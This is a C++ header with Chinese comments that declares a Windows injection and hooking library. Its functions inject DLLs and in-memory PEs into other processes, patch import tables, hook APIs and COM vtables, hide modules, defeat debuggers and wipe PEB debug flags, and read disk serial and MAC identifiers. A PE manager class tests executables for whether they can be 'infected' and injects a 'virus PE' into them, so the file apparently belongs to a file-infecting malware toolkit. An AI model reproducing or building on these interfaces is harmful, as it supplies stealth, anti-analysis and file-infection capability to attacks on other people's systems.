#pragma once

#pragma warning(disable:4200)

#define COMPONENT_PE_MGR		1
#define COMPONENT_DEBUGGER		0
#define COMPONENT_MD5			0
#define COMPONENT_SUPERVISOR	0

// 获得指定进程的UI线程Id，可以获得进程主窗体
extern "C" DWORD WINAPI GetMainThreadId(DWORD dwProcessId, HWND * pWnd = NULL);

// 根据线程在进程中的顺序获得线程ID
extern "C" DWORD WINAPI GetThreadIdByIndex(DWORD dwProcessId, DWORD dwIndex = 0);

// 获得指定进程父进程的id
extern "C" DWORD WINAPI GetParentProcessId(DWORD dwProcessId);

// 向目标进程注入一个DLL，通过获取目标线程中ThreadContext，detour线程当前代码来实现
extern "C" int WINAPI InjectDll(DWORD dwProcessId, LPCTSTR strDllName, DWORD dwThreadId = 0);

// 向目标进程注入一个DLL，以CreateRemoteThread实现
extern "C" int WINAPI InjectDllWithRemoteThread(DWORD dwProcessId, LPCTSTR strDllName);

// 创建一个子进程并注入一个dll，创建一个子进程后suspend住，通过修改子进程的内存导入表来实现
extern "C" BOOL WINAPI CreateProcessWithDllA(LPCSTR lpApplicationName,
											LPSTR lpCommandLine,
											LPSECURITY_ATTRIBUTES lpProcessAttributes,
											LPSECURITY_ATTRIBUTES lpThreadAttributes,
											BOOL bInheritHandles,
											DWORD dwCreationFlags,
											LPVOID lpEnvironment,
											LPCSTR lpCurrentDirectory,
											LPSTARTUPINFOA lpStartupInfo,
											LPPROCESS_INFORMATION lpProcessInformation,
											LPCSTR lpDetouredDllFullName,
											LPVOID pDetouredCreateProcessAProc);

extern "C" BOOL WINAPI CreateProcessWithDllW(LPCWSTR lpApplicationName,
											 LPWSTR lpCommandLine,
											 LPSECURITY_ATTRIBUTES lpProcessAttributes,
											 LPSECURITY_ATTRIBUTES lpThreadAttributes,
											 BOOL bInheritHandles,
											 DWORD dwCreationFlags,
											 LPVOID lpEnvironment,
											 LPCWSTR lpCurrentDirectory,
											 LPSTARTUPINFOW lpStartupInfo,
											 LPPROCESS_INFORMATION lpProcessInformation,
											 LPCSTR lpDetouredDllFullName,
											 LPVOID pDetouredCreateProcessWProc);

#if COMPONENT_PE_MGR
// 向目标进程注入一个内存dll，如果uSize > 0，lpszFile指向一块buffer，uSize为其长度，如果uSize为0，lpszFile为一个文件路径，如果dwThreadId为0，则自动寻找该进程主UI线程，否则按指定线程注入
extern "C" int WINAPI InjectMemDll(DWORD dwProcessId, LPCSTR lpszFile, UINT uSize = 0, DWORD dwThreadId = 0);

// 将一个内存dll的文件映像制作一个wrapper，直接call返回pDst的首址就能加载这个mem pe，返回值为处理后的wrapper buffer的有效长度
extern "C" int WINAPI MakeMemPEWrapper(PBYTE pMemPE, UINT uSrcSize, PBYTE pDst, UINT uDstSize);

// 在调CreateProcess之前调用，调用后，下次调用CreateProcess创建的进程就会被注入一个Mem dll，注入代码将在PE入口之前执行，此时CRT尚未初始化，仅工作于xp
extern "C" int WINAPI PrepareMemDllForNextProcess(LPVOID pFile, UINT uSize);

// 创建一个子进程并注入一个dll，返回创建的进程ID
extern BOOL WINAPI StartProcessAndInjectDll(HANDLE hToken,
											LPCSTR lpApplicationName,
											LPSTR lpCommandLine,
											LPSECURITY_ATTRIBUTES lpProcessAttributes,
											LPSECURITY_ATTRIBUTES lpThreadAttributes,
											BOOL bInheritHandles,
											DWORD dwCreationFlags,
											LPVOID lpEnvironment,
											LPCSTR lpCurrentDirectory,
											LPSTARTUPINFO lpStartupInfo,
											LPPROCESS_INFORMATION lpProcessInformation,
											LPCSTR sDllName);

extern BOOL WINAPI StartProcessAndInjectDll(LPCSTR sProcessName, LPCSTR sDllName);
#endif

// 将一个模块的指定DLL的导出函数替换掉，如果hMod为NULL，一般为可执行exe的handle
// 注意szDllName为.dll后缀，形式如"User32.dll"，"Gdi32.dll"，不要用full path
extern "C" LPVOID WINAPI ReplaceIATFunc(LPCSTR szModuleName, LPCSTR szDllName, LPCSTR szFuncName, LPVOID lpNewFunc, DWORD * pFuncAddr = NULL);

// MapViewOfSection的简单封装
extern "C" LPVOID WINAPI SimpleMapViewOfSection(HANDLE hObj, HANDLE hProcess, DWORD &dwSize, DWORD dwProtection);

// inline hook，返回处理后的原函数Detour入口，调用此地址即相当于调用原函数
// 注意：使用此hook时，如果bAutoPassingParam为TRUE，则新的函数声明与原函数不同，在原函数的参数前增加了两个参数，为Detour后的原函数调用入口，与Hook时传入的用户参数
// 例如：欲hook BOOL WINAPI GetWindowRect(HWND hWnd, LPRECT pRect)，则声明我们的函数原型应为BOOL WINAPI MyGetWindowRect(LPVOID pOldFunc, DWORD dwParam, HWND hWnd, LPRECT pRect);
extern "C" LPVOID ReplaceFuncAndCopy(LPVOID lpOldFunc, LPVOID lpNewFunc, BOOL bAutoPassingParam = FALSE, DWORD dwParam = 0);

// 还原由ReplaceFuncAndCopy替换的函数，lpDetour指向ReplaceFuncAndCopy时返回的地址
extern "C" void RestoreFunc(LPVOID lpDetour);

// 获得ReplaceFuncAndCopy时传入的用户参数，lpDetour指向ReplaceFuncAndCopy时返回的地址
extern "C" DWORD GetReplacedFuncParam(LPVOID lpDetour);

//安全写内存
extern "C" BOOL WINAPI WriteMem(HANDLE hProcess, LPVOID lpBaseAddr, const char *pBuff, unsigned int nSize);

// 隐藏调用进程中的指定模块
extern "C" BOOL WINAPI HideDll(LPCSTR lpszDllName);

// 获得模块的SectionHandle, size, 入口点
extern "C" BOOL WINAPI GetModuleInfo(HMODULE hMod, DWORD * pSize = NULL, HANDLE * pSectoin = NULL, LPVOID * pEOP = NULL);

// 反调试，开新线程反调试，循环检查
extern "C" void WINAPI AntiDebug();

// 利用Nt未公开函数反调试，如果bOnce为真则为一次性检查，否则创建独立线程循环检查
extern "C" void WINAPI AntiDebugByDebugPort(BOOL bOnce = TRUE);

// 专门针对softice反调试
extern "C" void WINAPI AntiSoftice(BOOL bOnce = TRUE);

// 清除peb中调试相关信息
extern "C" void WINAPI ErasePEBDebugFlag();

// 获得硬盘序列号
extern "C" BOOL WINAPI GetDiskSerialNumber(char szSerial[], UINT uSize);

// 获得网盘mac地址
extern "C" BOOL WINAPI GetMacInfo(int nMacNum, char szMac[], UINT uSize);

// 不可恢复报错，并破坏栈
extern "C" void WINAPI FatalError();

extern char * ReplaceMagic(char * szCode, DWORD dwSize, DWORD dwMagic,DWORD dwReal);


// 标准com对象的虚表hook工具类，要求此com对象遵循com标准，有STDMETHOD类型的Relase接口
class CComObjectHooker
{
public:
	// constant definitions
	enum enComObjectHookerDef
	{
		COH_MAGIC_NUMBER = 0x83757,
		COH_ADDR_MGR_SIZE = 2048,
		COH_THUNK_SIZE = 1024,
	};
	typedef struct tagComThunkHeader
	{
		DWORD dwMagicNumber;
		LPVOID pOldProc;
		DWORD dwUserParam;
		LPVOID pNewProc;
		BYTE pThunkCode[0];
	}COM_THUNK_HEADER;
public:
	CComObjectHooker(LPVOID pObject);
	~CComObjectHooker();
	static HRESULT QueryInterface(LPVOID pInterface, const IID & riid, void ** pQuery);
	static ULONG AddRef(LPVOID pInterface);
	static ULONG Release(LPVOID pInterface);
	static COM_THUNK_HEADER * GetInterfaceThunkHeader(LPVOID pInterface, int nVOffset);
	LPVOID GetRootInterface();
	// 调用时请注意，hook时填入的新函数相较原函数在开头多了两个新的参数，第一个参数是原函数地址，第二个是可选参数，由用户在hook时填入
	// 例如：原函数为HRESULT WINAPI OldFunc(int x), 则hook函数的形式应该为HRESULT WINAPI NewFunc(LPVOID pOldFunc, DWORD dwParam, int x)
	BOOL HookInterface(int nVOffset, LPVOID pNewFunc, DWORD dwParam = 0);
	static DWORD GetThunkCode(BYTE byCode[], DWORD dwSize);
	static LPVOID GetInterface(LPVOID pInterface, int nVOffset);
protected:
	static LPVOID SetInterface(LPVOID pInterface, int nVOffset, LPVOID pNewFunc);
	static HRESULT WINAPI FinalRelease(LPVOID pOldRelease, LPVOID pMgrAddr, LPVOID pThis);
	void AddRecordAddr(LPVOID pAllocAddr);
private:
	LPVOID m_pObject;
	LPVOID m_pMgrAddr;
};

#if COMPONENT_MD5
// 算MD5
extern "C" int SMd5(const char * inbuff,size_t len, char * outbuff, size_t outlen);
#endif

// 伪造函数头以干扰断点，可以指定pNew到指定的位置，如果不指定函数自己分配可执行代码段
extern "C" LPVOID WINAPI FakeFuncHead(LPVOID pOld, LPVOID pNew = NULL);

extern "C" void scMemcpy(void * pDest, const void * pSrc, size_t uSize);
extern "C" void scMemset(void * p, BYTE byVal, size_t uSize);

// 扫描64位特征码，可以传入一个FUNC_EXT的额外判断函数来加强判断
typedef BOOL (* FUNC_EXT)(LPVOID pFun);
extern "C" LPVOID ScanCode(LPVOID pStart, DWORD dwLen, const BYTE pChar[], DWORD dwCharLen, FUNC_EXT pFunc = NULL);

// 填入某一段特征值，倒着查找以返回函数头，找不到返回NULL
extern "C" LPVOID ReverseScanFuncHead(LPVOID p, DWORD dwFindLen);

// 判断是否32位进程
extern "C" BOOL Is32Process(HANDLE hProcess);

// bkd 字符串hash
extern "C" DWORD BKDHash(const char * szText);

#if COMPONENT_DEBUGGER
class CDebugger
{
public:
	typedef BOOL (WINAPI * FUNC_HANDLE_DEBUG_EVENT)(DEBUG_EVENT& de);
public:
	CDebugger();
	virtual ~CDebugger();
	BOOL CreateDebugProcess(LPCSTR lpszFile);
	BOOL Attach(DWORD dwProcessId, BOOL bKillOnExit);
	BOOL Detach();
	BOOL IsAttached();
	BOOL AddDebugEventHandler(FUNC_HANDLE_DEBUG_EVENT pFunc);
	BOOL DelDebugEventHandler(FUNC_HANDLE_DEBUG_EVENT pFunc);
	DWORD GetDebugProcessId();

	static CDebugger * GetInstance();
protected:
	static DWORD WINAPI _ThreadDebugEvent(LPVOID pParam);
	static DWORD WINAPI _ThreadCreateProcess(LPVOID pParam);
	void DebugLoop();
private:
	char m_szPath[MAX_PATH];
	DWORD m_dwProcessId;
	DWORD m_dwHandlerCount;
	BOOL m_bKillOnExit;
	FUNC_HANDLE_DEBUG_EVENT m_Func[10];
};
#endif

class CApiWrapper
{
public:
	typedef struct tagApiShare
	{
		LPVOID pMain;
		LPVOID pSub;
	}API_SHARE;
public:
	CApiWrapper();
	virtual ~CApiWrapper();

	BOOL GetApiShare(API_SHARE & api);
	BOOL SetApiShare(const API_SHARE & api);
public:
	virtual HMODULE GetModuleHandle( IN LPCSTR lpModuleName );
	virtual LPVOID GetProcAddress( IN HMODULE hModule, IN LPCSTR lpProcName);
	HANDLE CreateFileMapping(HANDLE hFile, LPSECURITY_ATTRIBUTES lpAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCTSTR lpName);
	LPVOID MapViewOfFile(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
	virtual LPVOID VirtualAlloc( IN LPVOID lpAddress, IN SIZE_T dwSize, IN DWORD flAllocationType, IN DWORD flProtect );
	BOOL UnmapViewOfFile(LPCVOID lpBaseAddress);
	virtual BOOL CloseHandle( IN OUT HANDLE hObject );
	virtual BOOL DebugActiveProcess(DWORD dwProcessId);
	virtual BOOL DebugActiveProcessStop(DWORD dwProcessId);
	virtual BOOL WaitForDebugEvent(LPDEBUG_EVENT lpDebugEvent, DWORD dwMilliseconds);
	virtual BOOL ContinueDebugEvent(DWORD dwProcessId, DWORD dwThreadId, DWORD dwContinueStatus);
	virtual BOOL DebugSetProcessKillOnExit(BOOL KillOnExit);
	virtual void ExitProcess( IN UINT uExitCode );
	virtual BOOL GetThreadContext(HANDLE hThread, LPCONTEXT lpContext);
	virtual HANDLE OpenThread(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId);
	virtual HANDLE OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
	virtual BOOL CreateProcessA( IN LPCSTR lpApplicationName, IN LPSTR lpCommandLine, IN LPSECURITY_ATTRIBUTES lpProcessAttributes, IN LPSECURITY_ATTRIBUTES lpThreadAttributes, IN BOOL bInheritHandles, IN DWORD dwCreationFlags, IN LPVOID lpEnvironment, IN LPCSTR lpCurrentDirectory, IN LPSTARTUPINFOA lpStartupInfo, OUT LPPROCESS_INFORMATION lpProcessInformation );
	virtual DWORD GetModuleFileNameA(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
	
	//1
	virtual HANDLE CreateThread( IN LPSECURITY_ATTRIBUTES lpThreadAttributes, IN SIZE_T dwStackSize, IN LPTHREAD_START_ROUTINE lpStartAddress, IN LPVOID lpParameter, IN DWORD dwCreationFlags, OUT LPDWORD lpThreadId );
	//2
	virtual DWORD GetTickCount();
	//3
	virtual void Sleep( IN DWORD dwMilliseconds );
	//4
	virtual DWORD WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
	//5
	virtual BOOL VirtualFree( IN LPVOID lpAddress, IN SIZE_T dwSize, IN DWORD dwFreeType );
	//6
	virtual BOOL SetEvent(HANDLE hEvent);
	//7
	virtual DWORD GetFileSize( IN HANDLE hFile, OUT LPDWORD lpFileSizeHigh );
	//8
	virtual HANDLE CreateFile( IN LPCSTR lpFileName, IN DWORD dwDesiredAccess, IN DWORD dwShareMode, IN LPSECURITY_ATTRIBUTES lpSecurityAttributes, IN DWORD dwCreationDisposition, IN DWORD dwFlagsAndAttributes, IN HANDLE hTemplateFile );
	//9
	virtual BOOL DeviceIoControl( IN HANDLE hDevice, IN DWORD dwIoControlCode, IN LPVOID lpInBuffer, IN DWORD nInBufferSize, OUT LPVOID lpOutBuffer, IN DWORD nOutBufferSize, OUT LPDWORD lpBytesReturned, IN LPOVERLAPPED lpOverlapped );
	//10
	virtual int MessageBoxA(IN HWND hWnd, IN LPCSTR lpText, IN LPCSTR lpCaption, IN UINT uType);
	//11
	virtual BOOL SetEnvironmentVariableA(LPCTSTR lpName, LPCTSTR lpValue);
	//12
	virtual DWORD GetEnvironmentVariableA( IN LPCSTR lpName, OUT LPSTR lpBuffer, IN DWORD nSize );	
	//13
	virtual DWORD GetCurrentProcessId();
    //14
	virtual LONG MapViewOfSection(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID *BaseAddress, ULONG ZeroBits, ULONG CommitSize, PLARGE_INTEGER SectionOffset, PULONG ViewSize, ULONG InheritDisposition, ULONG AllocationType, ULONG Protect);
	//15
	virtual LONG ZwQueryInformationProcess(IN HANDLE ProcessHandle, IN ULONG ProcessInformationClass, OUT PVOID ProcessInformation, IN ULONG ProcessInformationLength, OUT PULONG ReturnLength); 
	//16
	virtual HANDLE CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
	//17
	virtual BOOL Thread32First(HANDLE hSnapshot, LPVOID lpte);
	//18
	virtual BOOL Thread32Next( HANDLE hSnapshot, LPVOID lpte);
	//19
	virtual BOOL Process32First(HANDLE hSnapshot, LPVOID lppe);
	//20
	virtual BOOL Process32Next( HANDLE hSnapshot, LPVOID lppe );
	//21
	virtual BOOL TerminateProcess(HANDLE hProcess, UINT uExitCode);
	//22
	virtual DWORD ResumeThread( IN HANDLE hThread );
	//23
	virtual DWORD SuspendThread( IN HANDLE hThread );
	//24
	virtual LONG RegOpenKeyEx(HKEY hKey, LPCTSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
	//25
	virtual LONG RegQueryValueEx(HKEY hKey, LPCTSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
	//26
	virtual LONG RegCloseKey(HKEY hKey);
public:
	BOOL InitMain(DWORD dwProcessId);
	BOOL InitSub(DWORD dwProcessId);
	void Uninit();
	static CApiWrapper * GetInstance();
	static BOOL WINAPI OnIntCall(DEBUG_EVENT &de);

private:
	BOOL m_bMain;
	HANDLE m_hMapping;
	LPVOID m_pView;
};

#if COMPONENT_PE_MGR
class CPEMgr
{
public:
	enum
	{
		OPEN_FILE_READWRITE = 0,
		OPEN_FILE_READONLY,
		OPEN_MEM_FILE,
	};
	enum
	{
		TEST_CAN_INFECT = 0,
		TEST_FILE_IN_USE,
		TEST_ALREADY_INFECTED_DLL,
		TEST_ALREADY_INFECTED_PE,
		TEST_ALREADY_INFECTED_IAT,
		TEST_UNKNOWN_ERROR,
	};
public:
	CPEMgr();
	~CPEMgr();
	BOOL LoadPE(LPCSTR lpszPath, DWORD dwOpenFlag = 0);
	BOOL LoadMemPE(LPVOID pFileBase);
	PIMAGE_DOS_HEADER GetImageDosHeader();
	PIMAGE_NT_HEADERS GetNtHeaders();
	DWORD GetEntryPoint(BOOL bImage = FALSE);
	PIMAGE_SECTION_HEADER GetSectionHeader(LPCSTR lpszSectionName = NULL);
	BOOL InjectDllByEntryPoint(LPCSTR lpszDllName);
	BOOL InjectDllByIAT(LPCSTR lpszDllName, LPCSTR lpszFirstExportFunc);
	BOOL InjectPE(LPCSTR lpszVirusPeFile, DWORD dwSize = 0);
	// dest injected must have VirtualAlloc in import table, otherwise fail
	BOOL InjectPEWithoutNewSection(LPCSTR lpszVirusPeFile, DWORD dwSize = 0);
	BOOL AddSection(LPCSTR lpszSectionName, DWORD dwSize, DWORD dwCharacteristics);
	void Clear();
	DWORD GetAlignSize(DWORD dwSize, DWORD dwAlign);
	DWORD RVA2FileOffset(DWORD dwRVA);
	DWORD FileOffset2RVA(DWORD dwOffset);
	BOOL ResetCheckSum();
	BOOL AddFileSize(DWORD dwAdd);

	static LPVOID RunPE(LPCSTR lpszPath, DWORD dwSize = 0, HMODULE hHost = NULL);
	static void SimpleEncrypt(LPVOID pBuff, DWORD dwSize);
	static void SimpleDecrypt(LPVOID pBuff, DWORD dwSize);
	static LPVOID GetProcAddress(HMODULE hMod, LPCSTR lpszFuncName);
	// return entry point offset
	static DWORD CopyInjectPECode(LPVOID pDest, UINT &uSize);
	static int TestCanInjectWithoutSection(LPCSTR lpszFile);

protected:
	static int AsmFuncCenter(DWORD dwFuncId, LPVOID pParam = NULL, DWORD dwReserve1 = 0, DWORD dwReserve2 = 0);
private:
	BYTE * m_pBuff;
	HANDLE m_hFile;
	HANDLE m_hFileMapping;
	char m_szFilePath[260];
	BOOL m_dwOpenFlag;
};
#endif

#if COMPONENT_SUPERVISOR
class CSupervisor
{
public:
	typedef struct
	{
		DWORD dwProcessId;
		HMODULE hMod;
		BYTE szCheckSum[16];
	}PROTECT_NODE;
	typedef struct  
	{
		DWORD dwSupervisorId;
		DWORD dwCount;
		PROTECT_NODE node[1];
	}PROTECT_LIST;
public:
	CSupervisor();
	~CSupervisor();
	int Init();
	void Clear();
	BOOL AddProtectNode(HMODULE hMod, BYTE szCheckSum[16]);
	BOOL DelProtectNode(HMODULE hMod);
	BOOL DoScan();
	BOOL InstallSupervisor(LPCSTR lpszPath, UINT uSize = 0, DWORD dwProcessId = 0);
	BOOL EnumProtectList(LPTHREAD_START_ROUTINE pFunc);
	BOOL ScanTextSection(HANDLE hProcess, HMODULE hMod, BYTE szCheckSum[]);
	BOOL ScanMemBp(DWORD dwProcessId);
	BOOL ScanDebugger(HANDLE hProcess);
	void FoundException(HANDLE hProcess);	
protected:
	static DWORD WINAPI _ThreadScan(LPVOID pParam);
	BOOL ScanList();
	BOOL SetSupervisor(DWORD dwProcessId);
	DWORD GetSupervisor();
    	
private:
	HANDLE m_hFileMapping;
	LPVOID m_pView;
	HANDLE m_hLock;
};
#endif

enum
{
	INT_API_CALL = 0x3188,
	INT_SELF_CALL = 0x3189,
};


typedef struct tagReserveDllMainData
{
	LPVOID hHost;		// 加载者的虚拟首址
	LPVOID pBaseFile;	// mempe的内存文件首址
	DWORD dwFileSize;	// mempe的内存文件大小
}RESERVE_DLL_MAIN_DATA;

// 快速调原函数
_inline int _declspec(naked) CallOld(LPVOID pOldProc, int nParamNum, LPVOID pThis, BOOL bStdcall, int nParamStartIndex = 0)
{
	__asm
	{
		push ecx
			push ebx
			push ebp
			mov ebx, ebp
			add ebx, 8h
			mov ebp, esp
			add ebp, 0ch		
			mov ecx, [ebp + 8h]	// nParamNum
			mov eax, [ebp + 14h] // nParamStartIndex
			add eax, ecx
			imul eax, 4h
			add ebx, eax
push_param:
			cmp ecx, 0
				jle call_mark
				sub ebx, 4h
				push [ebx]
				dec ecx
					jmp push_param
call_mark:
				mov ecx, [ebp + 0ch] // pThis
				call [ebp + 4h]	// pOldProc
				mov ecx, eax
					cmp [ebp + 10h], 0	// bStdcall
					jnz end
					mov eax, [ebp + 8h]	// nParamNum
					imul eax, 4h
						add esp, eax
						mov eax, ecx
end:
					pop ebp
						pop ebx
						pop ecx
						ret
	}
}